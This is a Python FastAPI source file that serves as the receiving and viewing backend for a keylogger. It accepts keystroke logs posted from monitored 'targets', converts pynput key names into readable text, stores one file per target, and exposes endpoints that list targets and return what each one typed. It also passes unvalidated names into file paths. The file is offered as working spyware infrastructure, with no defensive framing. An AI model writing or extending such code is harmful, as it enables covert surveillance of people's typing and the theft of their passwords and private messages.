from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import os

app = FastAPI()

# Configuration
SAVE_DIR = "Logs"  # Directory to store logs
MAX_SIZE = 10 * 1024 * 1024  # 10MB per log file

# Ensure the Logs directory exists
if not os.path.exists(SAVE_DIR):
    os.makedirs(SAVE_DIR)

# Pydantic model to handle incoming log data
class LogData(BaseModel):
    logs: str
    user_name: str  # User name (or target name)

# Utility function to parse raw key logs
def parse_logs(raw_logs: str) -> str:
    key_mapping = {
        "Key.space": " ",
        "Key.enter": "[ENTER]",
        "Key.tab": "[TAB]",
        "Key.backspace": "[BACKSPACE]",
        "Key.ctrl_l": "[CTRL]",
        "Key.shift": "[SHIFT]",
        "Key.alt_l": "[ALT]",
        "Key.right": "[RIGHT]",
        "Key.left": "[LEFT]",
    }

    readable_logs = []
    for log in raw_logs.splitlines():
        if log in key_mapping:
            readable_logs.append(key_mapping[log])
        else:
            readable_logs.append(log.strip("'"))  # Remove single quotes for characters

    return "".join(readable_logs)

@app.get("/targets")
async def get_targets():
    """Returns a list of all available target log files."""
    try:
        targets = [f.split(".")[0] for f in os.listdir(SAVE_DIR) if f.endswith(".txt")]
        return {"targets": targets}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error retrieving targets: {str(e)}")

@app.get("/logs/{target_name}")
async def get_logs(target_name: str):
    """Returns the parsed logs for a specific target."""
    user_file = os.path.join(SAVE_DIR, f"{target_name}.txt")
    if not os.path.exists(user_file):
        raise HTTPException(status_code=404, detail="Log file not found")

    try:
        with open(user_file, "r") as f:
            raw_logs = f.read()
        parsed_logs = parse_logs(raw_logs)
        return {"target_name": target_name, "logs": parsed_logs}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error reading log file: {str(e)}")

@app.post("/logs")
async def post_logs(log_data: LogData):
    """Receives logs and stores them in the respective log file."""
    try:
        # Create a log file based on the user_name if it doesn't exist
        user_file = os.path.join(SAVE_DIR, f"{log_data.user_name}.txt")

        # Append the new logs to the file
        with open(user_file, "a") as f:
            f.write(log_data.logs + "\n")

        return {"message": "Logs received and saved successfully."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error saving logs: {str(e)}")

@app.get("/")
async def main():
    """Serves the HTML page."""
    try:
        with open("index.html", "r") as f:
            return HTMLResponse(f.read())
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail="index.html not found")
